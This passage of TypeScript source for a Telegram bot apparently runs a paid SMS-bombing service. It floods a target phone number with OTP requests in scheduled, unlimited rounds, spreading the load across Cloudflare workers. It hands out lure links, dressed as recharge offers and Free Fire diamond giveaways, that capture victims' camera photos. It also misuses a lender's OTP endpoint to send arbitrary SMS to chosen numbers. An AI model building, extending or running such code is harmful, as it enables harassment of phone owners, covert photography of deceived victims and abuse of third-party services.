        await editMessage(chatId, msgId, `📅 <b>Schedule Hit</b>\n\nActive Schedules: <b>${count}</b>\n\nSchedule se automatic hitting hoti rahegi har set interval pe.`, {
          inline_keyboard: [[{ text: '➕ New Schedule', callback_data: 'schedule_new' }], [{ text: '📋 My Schedules', callback_data: 'schedule_list' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
        });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Schedule: New ---
      if (data === 'schedule_new') {
        if (!ctx.premium.isPremium && !admin) {
          await editMessage(chatId, msgId, '🔒 <b>Premium Feature!</b>\n\n💬 Contact: @xyzdark62', { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
          return new Response('OK', { headers: corsHeaders });
        }
        await setBotState(chatId, { waiting_schedule_phone: true });
        await editMessage(chatId, msgId, '📅 <b>New Schedule</b>\n\n📱 Phone number bhejo with interval:\n\n<code>9876543210 60 10</code>\n<i>(number interval_seconds max_rounds)</i>\n\n• interval_seconds: kitne second baad repeat (default: 60)\n• max_rounds: kitne round max (0 = unlimited, default: 0)');
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Schedule: List ---
      if (data === 'schedule_list') {
        const { data: schedules } = await supabase.from('scheduled_hits').select('*').order('created_at', { ascending: false }).limit(10);
        if (!schedules || schedules.length === 0) {
          await editMessage(chatId, msgId, '📋 <b>No schedules found!</b>\n\n➕ Naya schedule banao.', { inline_keyboard: [[{ text: '➕ New Schedule', callback_data: 'schedule_new' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
          return new Response('OK', { headers: corsHeaders });
        }
        let text = `📋 <b>Schedules (${schedules.length})</b>\n\n`;
        const buttons: any[][] = [];
        for (const s of schedules) {
          const status = s.is_active ? '🟢' : '🔴';
          const maxR = s.max_rounds ? `/${s.max_rounds}` : '/∞';
          text += `${status} <code>${s.phone_number}</code>\n   ⏱️ ${s.interval_seconds}s | 🔄 ${s.total_hits}${maxR} hits\n   ID: <code>${s.id.slice(0, 8)}</code>\n\n`;
          if (s.is_active) buttons.push([{ text: `🛑 Stop ${s.phone_number}`, callback_data: `schedule_stop:${s.id}` }]);
          else buttons.push([{ text: `🗑️ Delete ${s.phone_number}`, callback_data: `schedule_del:${s.id}` }]);
        }
        buttons.push([{ text: '➕ New Schedule', callback_data: 'schedule_new' }]);
        buttons.push([{ text: '🏠 Main Menu', callback_data: 'main_menu' }]);
        await editMessage(chatId, msgId, text, { inline_keyboard: buttons });
        return new Response('OK', { headers: corsHeaders });
      }

      if (data.startsWith('schedule_stop:')) {
        const scheduleId = data.split(':')[1];
        await supabase.from('scheduled_hits').update({ is_active: false }).eq('id', scheduleId);
        await editMessage(chatId, msgId, '🛑 <b>Schedule stopped!</b>', { inline_keyboard: [[{ text: '📋 My Schedules', callback_data: 'schedule_list' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
        return new Response('OK', { headers: corsHeaders });
      }

      if (data.startsWith('schedule_del:')) {
        const scheduleId = data.split(':')[1];
        await supabase.from('scheduled_hits').delete().eq('id', scheduleId);
        await editMessage(chatId, msgId, '🗑️ <b>Schedule deleted!</b>', { inline_keyboard: [[{ text: '📋 My Schedules', callback_data: 'schedule_list' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Camera Capture ---
      if (data === 'camera_capture') {
        if (!ctx.config.services.cameraCapture) {
          await editMessage(chatId, msgId, '❌ <b>Camera Capture is disabled by admin.</b>', { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
          return new Response('OK', { headers: corsHeaders });
        }
        let sessionId = await getSetting(`tgbot_cam_link_${chatId}`);
        if (!sessionId) {
          sessionId = `tgcam_${chatId}`;
          await setSetting(`tgbot_cam_link_${chatId}`, sessionId);
        }
        const mainSettings = await getSetting('main_settings');
        const siteUrl = mainSettings?.siteUrl || Deno.env.get('SITE_URL') || 'https://riyakichut.lovable.app';
        const captureLink = `${siteUrl}/capture?session=${sessionId}`;
        const chromeLink = `${siteUrl}/chrome-custom-capture?session=${sessionId}`;
        const customLink = `${siteUrl}/custom-capture?session=${sessionId}`;
        const rechargeLink = `${siteUrl}/recharge?session=${sessionId}`;
        const freefireLink = `${siteUrl}/freefire?session=${sessionId}`;
        let text = `📷 <b>Camera Capture</b>\n\n🔗 <b>Your Permanent Links:</b>\n\n📱 Normal:\n<code>${captureLink}</code>\n\n🌐 Chrome (Android):\n<code>${chromeLink}</code>\n\n🎨 Custom HTML:\n<code>${customLink}</code>\n\n💰 Recharge:\n<code>${rechargeLink}</code>\n\n🔥 Free Fire Diamond (NEW):\n<code>${freefireLink}</code>\n\n<i>📸 Ye links permanent hai, bar bar generate nahi hoge.\nPhotos sirf tumhare chat me aayengi.</i>`;
        await editMessage(chatId, msgId, text, { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Service Toggles (Admin) ---
      if (data === 'service_toggles') {
        if (!admin) return new Response('OK', { headers: corsHeaders });
        const svc = ctx.config.services;
        let text = `🔧 <b>Service Controls</b>\n\nToggle services on/off for all users:\n\n🚀 Hit API: ${svc.hitApi ? '🟢 ON' : '🔴 OFF'}\n📅 Schedule: ${svc.schedule ? '🟢 ON' : '🔴 OFF'}\n📲 Custom SMS: ${svc.customSms ? '🟢 ON' : '🔴 OFF'}\n📷 Camera Capture: ${svc.cameraCapture ? '🟢 ON' : '🔴 OFF'}\n`;
        await editMessage(chatId, msgId, text, {
          inline_keyboard: [
            [{ text: `🚀 Hit API ${svc.hitApi ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:hitApi' }],
            [{ text: `📅 Schedule ${svc.schedule ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:schedule' }],
            [{ text: `📲 Custom SMS ${svc.customSms ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:customSms' }],
            [{ text: `📷 Camera ${svc.cameraCapture ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:cameraCapture' }],
            [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
          ],
        });
        return new Response('OK', { headers: corsHeaders });
      }

      if (data.startsWith('toggle_svc:')) {
        if (!admin) return new Response('OK', { headers: corsHeaders });
        const svcKey = data.split(':')[1] as keyof BotConfig['services'];
        const config = ctx.config;
        if (svcKey in config.services) {
          config.services[svcKey] = !config.services[svcKey];
          await setSetting('tgbot_config', config);
          const svc = config.services;
          let text = `🔧 <b>Service Controls</b>\n\nToggle services on/off for all users:\n\n🚀 Hit API: ${svc.hitApi ? '🟢 ON' : '🔴 OFF'}\n📅 Schedule: ${svc.schedule ? '🟢 ON' : '🔴 OFF'}\n📲 Custom SMS: ${svc.customSms ? '🟢 ON' : '🔴 OFF'}\n📷 Camera Capture: ${svc.cameraCapture ? '🟢 ON' : '🔴 OFF'}\n`;
          await editMessage(chatId, msgId, text, {
            inline_keyboard: [
              [{ text: `🚀 Hit API ${svc.hitApi ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:hitApi' }],
              [{ text: `📅 Schedule ${svc.schedule ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:schedule' }],
              [{ text: `📲 Custom SMS ${svc.customSms ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:customSms' }],
              [{ text: `📷 Camera ${svc.cameraCapture ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:cameraCapture' }],
              [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
            ],
          });
        }
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Stats ---
      if (data === 'stats') {
        const [global, apis, workers] = await Promise.all([getGlobalStats(), getEnabledApis(), getCfWorkers()]);
        const todayHitsDisplay = (ctx.premium.isPremium || admin) ? ctx.usage.today : Math.min(ctx.usage.today, ctx.config.dailyLimit);
        let statsText = `📊 <b>Statistics</b>\n\n👤 <b>Your Stats:</b>\n• Today: ${todayHitsDisplay} hits\n• Total: ${ctx.usage.total} hits\n• Plan: ${ctx.premium.isPremium ? `💎 ${ctx.premium.plan}` : '🆓 Free'}\n• Daily Limit: ${ctx.premium.isPremium ? '♾️ Unlimited' : ctx.config.dailyLimit}\n\n🌐 <b>Global Stats:</b>\n• Total Hits: ${global.totalHits}\n• Total Users: ${global.totalUsers}\n• Active APIs: ${apis.length}\n• CF Workers: ${workers.length}`;
        await editMessage(chatId, msgId, statsText, { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Settings ---
      if (data === 'settings') {
        const c = ctx.config;
        await editMessage(chatId, msgId, `⚙️ <b>Settings</b>\n\n📊 Default Rounds: ${c.defaultRounds}\n📦 Default Batch: ${c.defaultBatch}\n⏱️ Default Delay: ${c.defaultDelay}s\n📈 Daily Limit (Free): ${c.dailyLimit}\n\n<b>Change settings:</b>\n/setsettings R B D - Change defaults\nExample: <code>/setsettings 5 10 3</code>`, { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Premium Menu ---
      if (data === 'premium_menu') {
        let text = `💎 <b>Premium</b>\n\n`;
        text += ctx.premium.isPremium ? `✅ You have <b>Unlimited</b> plan!\n\n` : `You're on the <b>Free</b> plan.\n\n`;
        text += `<b>Plan:</b>\n🥇 <b>Unlimited</b> - ₹199\n• Unlimited daily hits\n• All features unlocked\n• Priority support\n\n💬 Contact: @xyzdark62`;
        await editMessage(chatId, msgId, text, { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Workers ---
      if (data === 'workers') {
        const workers = await getCfWorkers();
        let text = `☁️ <b>CF Workers (${workers.length})</b>\n\n`;
        if (workers.length === 0) text += `No custom workers. Default worker active.\n\n`;
        else workers.forEach((w, i) => { text += `${i + 1}. <code>${w}</code>\n`; });
        text += `\n📝 <b>Commands:</b>\n/addworker URL - Add worker\n/delworker URL - Remove\n/clearworkers - Reset\n\n💡 Multiple workers = load balancing!\n${workers.length || 1} workers = ${(workers.length || 1) * 100}k req/day`;
        await editMessage(chatId, msgId, text, { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Admin Panel ---
      if (data === 'admin_panel' && admin) {
        let text = `🔐 <b>Admin Panel</b>\n\n/apis - List all APIs\n/addapi NAME|URL - Add GET API\n/delapi API_ID - Delete API\n/toggleapi API_ID - Enable/disable\n/keys - List access keys\n/addkey PASSWORD - Add key\n/delkey PASSWORD - Delete key\n/broadcast MSG - Broadcast to all\n/setlimit N - Free user daily limit\n/setsettings R B D - Change defaults`;
        await editMessage(chatId, msgId, text, { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Give Premium ---
      if (data === 'give_unlimited' || data === 'give_basic' || data === 'give_pro' || data === 'give_ultimate') {
        if (!admin) { await editMessage(chatId, msgId, '❌ Admin only.'); return new Response('OK', { headers: corsHeaders }); }
        await setBotState(chatId, { waiting_premium: true, premiumPlan: 'Unlimited' });
        await editMessage(chatId, msgId, `🎁 <b>Give Unlimited Premium</b>\n\nUser ka Telegram ID bhejo:\n<code>/givepremium USER_ID Unlimited 30</code>\n<i>(ID plan days)</i>`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (data === 'remove_premium_prompt') {
        if (!admin) { await editMessage(chatId, msgId, '❌ Admin only.'); return new Response('OK', { headers: corsHeaders }); }
        await editMessage(chatId, msgId, '🗑️ <b>Remove Premium</b>\n\nUser ka ID bhejo:\n<code>/removepremium USER_ID</code>');
        return new Response('OK', { headers: corsHeaders });
      }

      if (data === 'broadcast_prompt') {
        if (!admin) { await editMessage(chatId, msgId, '❌ Admin only.'); return new Response('OK', { headers: corsHeaders }); }
        await setBotState(chatId, { waiting_broadcast: true });
        await editMessage(chatId, msgId, '📢 <b>Broadcast</b>\n\nMessage bhejo jo sabko jayega:\n<code>/broadcast Your message here</code>');
        return new Response('OK', { headers: corsHeaders });
      }

      if (data === 'set_limit_prompt') {
        if (!admin) { await editMessage(chatId, msgId, '❌ Admin only.'); return new Response('OK', { headers: corsHeaders }); }
        await editMessage(chatId, msgId, '📊 <b>Set Daily Limit</b>\n\n<code>/setlimit 10</code>\n<i>(Free users ke liye daily limit)</i>');
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Hit Again ---
      if (data.startsWith('hit_again:')) {
        const parts = data.split(':');
        const phone = parts[1];
        const batch = parseInt(parts[3]) || 5;
        const delay = parseInt(parts[4]) || 2;
        await editMessage(chatId, msgId, `🔄 <b>Re-starting non-stop hitting...</b>`);
        await runHitsForPhone(chatId, phone, 1, batch, delay);
        return new Response('OK', { headers: corsHeaders });
      }

      return new Response('OK', { headers: corsHeaders });
    }

    // ========== TEXT MESSAGES ==========
    if (update.message) {
      const msg = update.message;
      const chatId = msg.chat.id;
      const text = (msg.text || '').trim();

      // Load context in ONE batch query
      const ctx = await loadUserContext(chatId);
      const admin = ctx.admin;

      // Non-blocking user tracking
      trackUserAsync(chatId);

      // --- /start ---
      if (text === '/start') {
        let greeting = '🔥 <b>Hit API Bot</b>\n\n';
        if (ctx.premium.isPremium || admin) {
          greeting += '💎 <b>Unlimited</b> access\n';
        } else {
          const usedToday = Math.min(ctx.usage.today, ctx.config.dailyLimit);
          greeting += `📊 Daily Limit: <b>${usedToday}/${ctx.config.dailyLimit}</b>\n`;
        }
        greeting += '\nSelect an option:';
        await sendMessage(chatId, greeting, await getMainMenuKeyboard(admin, chatId, ctx));
        return new Response('OK', { headers: corsHeaders });
      }

      // --- /help ---
      if (text === '/help') {
        let helpText = `📖 <b>Bot Commands</b>\n\n<b>General:</b>\n/start - Main menu\n/stats - View statistics\n/settings - Hit settings guide\n/help - This help\n\n<b>Hit API:</b>\nSend phone number: <code>1234567890</code>\nWith params: <code>1234567890 5 10 3</code>\n(number rounds batch delay)\n`;
        if (admin) {
          helpText += `\n🔐 <b>Admin Commands:</b>\n/setlimit N - Free user daily limit\n/setsettings R B D - Change defaults\n/apis - List all APIs\n/addapi NAME|URL - Add GET API\n/delapi API_ID - Delete API\n/toggleapi API_ID - Enable/disable\n/keys - List access keys\n/addkey PASSWORD - Add key\n/delkey PASSWORD - Delete key\n/givepremium ID PLAN DAYS - Give premium\n/removepremium ID - Remove premium\n/premium - List premium users\n/broadcast MSG - Broadcast to all\n/workers - List CF workers\n/addworker URL - Add CF worker\n/delworker URL - Remove worker\n/clearworkers - Reset workers\n/logout - Logout admin`;
        }
        await sendMessage(chatId, helpText);
        return new Response('OK', { headers: corsHeaders });
      }

      // --- /stats ---
      if (text === '/stats') {
        const [global] = await Promise.all([getGlobalStats()]);
        const todayHitsDisplay = (ctx.premium.isPremium || admin) ? ctx.usage.today : Math.min(ctx.usage.today, ctx.config.dailyLimit);
        await sendMessage(chatId, `📊 <b>Stats</b>\n\n👤 Today: ${todayHitsDisplay} | Total: ${ctx.usage.total}\n💎 Plan: ${ctx.premium.isPremium ? ctx.premium.plan : 'Free'}\n📈 Limit: ${ctx.premium.isPremium ? '♾️' : ctx.config.dailyLimit}\n\n🌐 Global Hits: ${global.totalHits} | Users: ${global.totalUsers}`);
        return new Response('OK', { headers: corsHeaders });
      }

      // --- /settings ---
      if (text === '/settings') {
        await sendMessage(chatId, `⚙️ <b>Settings</b>\n\nRounds: ${ctx.config.defaultRounds} | Batch: ${ctx.config.defaultBatch} | Delay: ${ctx.config.defaultDelay}s\nDaily Limit: ${ctx.config.dailyLimit}\n\nChange: <code>/setsettings R B D</code>`);
        return new Response('OK', { headers: corsHeaders });
      }

      // === ADMIN COMMANDS ===
      if (text.startsWith('/setlimit') && admin) {
        const num = parseInt(text.split(' ')[1]);
        if (isNaN(num) || num < 1) { await sendMessage(chatId, '❌ Usage: <code>/setlimit 10</code>'); return new Response('OK', { headers: corsHeaders }); }
        ctx.config.dailyLimit = num;
        await setSetting('tgbot_config', ctx.config);
        await sendMessage(chatId, `✅ Daily limit set to <b>${num}</b>`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/setsettings') && admin) {
        const parts = text.split(/\s+/).slice(1);
        if (parts.length < 3) { await sendMessage(chatId, '❌ Usage: <code>/setsettings 5 10 3</code> (rounds batch delay)'); return new Response('OK', { headers: corsHeaders }); }
        ctx.config.defaultRounds = parseInt(parts[0]) || 1;
        ctx.config.defaultBatch = parseInt(parts[1]) || 5;
        ctx.config.defaultDelay = parseInt(parts[2]) || 2;
        await setSetting('tgbot_config', ctx.config);
        await sendMessage(chatId, `✅ Settings updated!\nRounds: ${ctx.config.defaultRounds} | Batch: ${ctx.config.defaultBatch} | Delay: ${ctx.config.defaultDelay}s`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text === '/apis' && admin) {
        const { data: allApis } = await supabase.from('hit_apis').select('id, name, url, enabled');
        if (!allApis || allApis.length === 0) { await sendMessage(chatId, '📝 No APIs found.'); return new Response('OK', { headers: corsHeaders }); }
        let apiText = `📝 <b>APIs (${allApis.length})</b>\n\n`;
        allApis.forEach((a, i) => { apiText += `${i + 1}. ${a.enabled ? '✅' : '❌'} <b>${a.name}</b>\nID: <code>${a.id}</code>\n${a.url.slice(0, 50)}...\n\n`; });
        await sendMessage(chatId, apiText);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/addapi') && admin) {
        const rest = text.slice(7).trim();
        const [name, ...urlParts] = rest.split('|');
        const apiUrl = urlParts.join('|').trim();
        if (!name || !apiUrl) { await sendMessage(chatId, '❌ Usage: <code>/addapi Name|URL</code>'); return new Response('OK', { headers: corsHeaders }); }
        await supabase.from('hit_apis').insert({ name: name.trim(), url: apiUrl, method: 'GET', enabled: true });
        await sendMessage(chatId, `✅ API added: <b>${name.trim()}</b>`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/delapi') && admin) {
        const id = text.split(' ')[1]?.trim();
        if (!id) { await sendMessage(chatId, '❌ Usage: <code>/delapi API_ID</code>'); return new Response('OK', { headers: corsHeaders }); }
        await supabase.from('hit_apis').delete().eq('id', id);
        await sendMessage(chatId, `✅ API deleted: <code>${id}</code>`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/toggleapi') && admin) {
        const id = text.split(' ')[1]?.trim();
        if (!id) { await sendMessage(chatId, '❌ Usage: <code>/toggleapi API_ID</code>'); return new Response('OK', { headers: corsHeaders }); }
        const { data: api } = await supabase.from('hit_apis').select('enabled').eq('id', id).single();
        if (!api) { await sendMessage(chatId, '❌ API not found.'); return new Response('OK', { headers: corsHeaders }); }
        await supabase.from('hit_apis').update({ enabled: !api.enabled }).eq('id', id);
        await sendMessage(chatId, `✅ API ${!api.enabled ? 'enabled' : 'disabled'}`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text === '/keys' && admin) {
        const keys = await getAccessKeys();
        if (keys.length === 0) { await sendMessage(chatId, '🔑 No access keys set.'); return new Response('OK', { headers: corsHeaders }); }
        await sendMessage(chatId, `🔑 <b>Access Keys (${keys.length})</b>\n\n` + keys.map((k, i) => `${i + 1}. <code>${k}</code>`).join('\n'));
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/addkey') && admin) {
        const key = text.split(' ').slice(1).join(' ').trim();
        if (!key) { await sendMessage(chatId, '❌ Usage: <code>/addkey PASSWORD</code>'); return new Response('OK', { headers: corsHeaders }); }
        const keys = await getAccessKeys();
        if (!keys.includes(key)) keys.push(key);
        await setSetting('tgbot_access_keys', keys);
        await sendMessage(chatId, `✅ Key added: <code>${key}</code>`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/delkey') && admin) {
        const key = text.split(' ').slice(1).join(' ').trim();
        if (!key) { await sendMessage(chatId, '❌ Usage: <code>/delkey PASSWORD</code>'); return new Response('OK', { headers: corsHeaders }); }
        const keys = await getAccessKeys();
        await setSetting('tgbot_access_keys', keys.filter(k => k !== key));
        await sendMessage(chatId, `✅ Key removed: <code>${key}</code>`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/givepremium') && admin) {
        const parts = text.split(/\s+/).slice(1);
        if (parts.length < 3) { await sendMessage(chatId, '❌ Usage: <code>/givepremium USER_ID PLAN DAYS</code>'); return new Response('OK', { headers: corsHeaders }); }
        const userId = parseInt(parts[0]);
        const plan = parts[1];
        const days = parseInt(parts[2]) || 30;
        if (isNaN(userId)) { await sendMessage(chatId, '❌ Invalid user ID'); return new Response('OK', { headers: corsHeaders }); }
        const users = await getPremiumUsers();
        users[String(userId)] = { plan, expiresAt: new Date(Date.now() + days * 86400000).toISOString(), userId };
        await setSetting('tgbot_premium_users', users);
        await sendMessage(chatId, `✅ Premium <b>${plan}</b> given to <code>${userId}</code> for ${days} days`);
        try { await sendMessage(userId, `🎉 You've been given <b>${plan}</b> premium for ${days} days!`); } catch {}
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/removepremium') && admin) {
        const userId = text.split(' ')[1]?.trim();
        if (!userId) { await sendMessage(chatId, '❌ Usage: <code>/removepremium USER_ID</code>'); return new Response('OK', { headers: corsHeaders }); }
        const users = await getPremiumUsers();
        delete users[userId];
        await setSetting('tgbot_premium_users', users);
        await sendMessage(chatId, `✅ Premium removed for <code>${userId}</code>`);
        try { await sendMessage(parseInt(userId), '⚠️ Your premium has been removed.'); } catch {}
        return new Response('OK', { headers: corsHeaders });
      }

      if (text === '/premium' && admin) {
        const users = await getPremiumUsers();
        const entries = Object.entries(users);
        if (entries.length === 0) { await sendMessage(chatId, '💎 No premium users.'); return new Response('OK', { headers: corsHeaders }); }
        let t = `💎 <b>Premium Users (${entries.length})</b>\n\n`;
        entries.forEach(([id, info]: [string, any]) => {
          const remaining = Math.max(0, Math.ceil((new Date(info.expiresAt).getTime() - Date.now()) / 86400000));
          t += `• <code>${id}</code> - ${info.plan} (${remaining}d left)\n`;
        });
        await sendMessage(chatId, t);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/broadcast') && admin) {
        const message = text.slice(10).trim();
        if (!message) { await sendMessage(chatId, '❌ Usage: <code>/broadcast Your message</code>'); return new Response('OK', { headers: corsHeaders }); }
        const allUsers = (await getSetting('tgbot_all_users')) || [];
        let sent = 0, failed = 0;
        for (const uid of allUsers) {
          try { await sendMessage(uid, `📢 <b>Broadcast</b>\n\n${message}`); sent++; } catch { failed++; }
        }
        await sendMessage(chatId, `✅ Broadcast sent!\n✅ Delivered: ${sent}\n❌ Failed: ${failed}`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text === '/workers') {
        const workers = await getCfWorkers();
        let t = `☁️ <b>CF Workers (${workers.length})</b>\n\n`;
        if (workers.length === 0) t += `No custom workers. Default worker active.\n\n`;
        else workers.forEach((w, i) => { t += `${i + 1}. <code>${w}</code>\n`; });
        t += `\n📝 <b>Commands:</b>\n/addworker URL - Add worker\n/delworker URL - Remove\n/clearworkers - Reset\n\n💡 Multiple workers = load balancing!\n${workers.length || 1} workers = ${(workers.length || 1) * 100}k req/day`;
        await sendMessage(chatId, t);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/addworker') && admin) {
        const workerUrl = text.split(' ').slice(1).join(' ').trim();
        if (!workerUrl || !workerUrl.startsWith('http')) { await sendMessage(chatId, '❌ Usage: <code>/addworker https://worker.example.workers.dev</code>'); return new Response('OK', { headers: corsHeaders }); }
        const workers = await getCfWorkers();
        if (!workers.includes(workerUrl)) workers.push(workerUrl);
        await setSetting('tgbot_cf_workers', workers);
        await sendMessage(chatId, `✅ Worker added!\n☁️ Total: ${workers.length} workers = ${workers.length * 100}k req/day`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/delworker') && admin) {
        const workerUrl = text.split(' ').slice(1).join(' ').trim();
        if (!workerUrl) { await sendMessage(chatId, '❌ Usage: <code>/delworker URL</code>'); return new Response('OK', { headers: corsHeaders }); }
        const workers = await getCfWorkers();
        await setSetting('tgbot_cf_workers', workers.filter(w => w !== workerUrl));
        await sendMessage(chatId, `✅ Worker removed! Remaining: ${workers.filter(w => w !== workerUrl).length}`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text === '/clearworkers' && admin) {
        await setSetting('tgbot_cf_workers', []);
        await sendMessage(chatId, '✅ All workers cleared!');
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/setmode') && admin) {
        const mode = text.split(' ')[1]?.trim()?.toLowerCase();
        if (mode !== 'edge' && mode !== 'cloudflare' && mode !== 'cf') {
          const currentMode = await getHitProxyMode();
          await sendMessage(chatId, `🌐 <b>Current Mode:</b> ${currentMode === 'cloudflare' ? '☁️ CF Worker' : '⚡ Edge Function'}\n\n<b>Change:</b>\n<code>/setmode edge</code> - Edge Function\n<code>/setmode cf</code> - CF Worker`);
          return new Response('OK', { headers: corsHeaders });
        }
        const newMode = (mode === 'cf' || mode === 'cloudflare') ? 'cloudflare' : 'edge';
        await setHitProxyMode(newMode);
        await sendMessage(chatId, `✅ Mode changed to <b>${newMode === 'cloudflare' ? '☁️ CF Worker' : '⚡ Edge Function'}</b>\n\n<i>Website aur bot dono sync ho gaye!</i>`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text === '/setadmin') {
        const admins = ctx.adminIds;
        if (admins.length <= 1 && admins[0] === OWNER_CHAT_ID && !admins.includes(chatId)) {
          await setSetting('tgbot_admin_ids', [chatId]);
          await sendMessage(chatId, `✅ You are now admin! ID: <code>${chatId}</code>`);
        } else if (admin) {
          await sendMessage(chatId, `✅ You're already admin!`);
        } else {
          await sendMessage(chatId, '❌ Admin already set. Contact existing admin.');
        }
        return new Response('OK', { headers: corsHeaders });
      }

      if (text.startsWith('/addadmin') && admin) {
        const newId = parseInt(text.split(' ')[1]);
        if (isNaN(newId)) { await sendMessage(chatId, '❌ Usage: <code>/addadmin USER_ID</code>'); return new Response('OK', { headers: corsHeaders }); }
        const admins = await getAdminIds();
        if (!admins.includes(newId)) admins.push(newId);
        await setSetting('tgbot_admin_ids', admins);
        await sendMessage(chatId, `✅ Admin added: <code>${newId}</code>`);
        return new Response('OK', { headers: corsHeaders });
      }

      if (text === '/logout' && admin) {
        const admins = await getAdminIds();
        await setSetting('tgbot_admin_ids', admins.filter((id: number) => id !== chatId));
        await sendMessage(chatId, '✅ Logged out from admin!');
        return new Response('OK', { headers: corsHeaders });
      }

      if (/^\/stop(@[\w_]+)?$/i.test(text)) {
        await setBotState(chatId, { running: false, waiting_phone: false });
        await sendMessage(chatId, '🛑 <b>Stop request received.</b>\n\nStatus message ab turant STOPPED pe update ho jayega.');
        return new Response('OK', { headers: corsHeaders });
      }

      // ===== Custom SMS Handling =====
      const state = ctx.state;

      if (state?.waiting_custom_sms || state?.waiting_custom_sms_service) {
        await setBotState(chatId, { waiting_custom_sms_service: true });
        await sendMessage(chatId, getCustomSmsServicePrompt(), getCustomSmsServiceKeyboard());
        return new Response('OK', { headers: corsHeaders });
      }

      if (state?.waiting_custom_sms_number) {
        const phone = text.replace(/[^0-9+]/g, '');
        const service = state.customSmsService as CustomSmsService | undefined;
        if (!/^\+?[0-9]{10,15}$/.test(phone)) {
          await sendMessage(chatId, '❌ <b>Invalid number!</b>\n\n<code>98765432xx</code>');
          return new Response('OK', { headers: corsHeaders });
        }
        if (!service || !(service in CUSTOM_SMS_SERVICES)) {
          await setBotState(chatId, { waiting_custom_sms_service: true });
          await sendMessage(chatId, getCustomSmsServicePrompt(), getCustomSmsServiceKeyboard());
          return new Response('OK', { headers: corsHeaders });
        }
        await setBotState(chatId, { waiting_custom_sms_msg: true, customSmsService: service, customSmsNumber: phone });
        await sendMessage(chatId, getCustomSmsMsgPrompt(service, phone), {
          inline_keyboard: [[{ text: '⬅️ Change Service', callback_data: 'custom_sms' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
        });
        return new Response('OK', { headers: corsHeaders });
      }

      if (state?.waiting_custom_sms_msg) {
        const service = state.customSmsService as CustomSmsService | undefined;
        const phone = String(state.customSmsNumber || '').replace(/[^0-9+]/g, '');
        if (!service || !(service in CUSTOM_SMS_SERVICES) || !phone) {
          await setBotState(chatId, { waiting_custom_sms_service: true });
          await sendMessage(chatId, getCustomSmsServicePrompt(), getCustomSmsServiceKeyboard());
          return new Response('OK', { headers: corsHeaders });
        }
        const serviceConfig = CUSTOM_SMS_SERVICES[service];
        const msgValue = text || serviceConfig.defaultMsg;
        await setBotState(chatId, {});

        const supabaseUrl = Deno.env.get('SUPABASE_URL') ?? '';
        const anonKey = Deno.env.get('SUPABASE_ANON_KEY') ?? Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '';
        try {
          const mpRes = await fetch(`${supabaseUrl}/functions/v1/mpokket-otp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${anonKey}` },
            body: JSON.stringify({ number: phone, msg: msgValue, service }),
          });
          const mpData = await mpRes.json();
          let resultText = `📲 <b>${serviceConfig.label} OTP Result</b>\n\n🧩 Service: <b>${serviceConfig.label}</b>\n📱 Number: <code>${phone}</code>\n📝 ${serviceConfig.msgLabel}: <code>${escapeHtml(msgValue)}</code>\n✅ Status: <b>${mpData.success ? 'Sent' : 'Failed'}</b>\n📊 Code: ${mpData.status_code || 'N/A'}\n\n`;
          const responsePayload = mpData.data ?? mpData;
          if (responsePayload) resultText += `📋 Response:\n<code>${escapeHtml(JSON.stringify(responsePayload, null, 2).slice(0, 800))}</code>`;
          await sendMessage(chatId, resultText, {
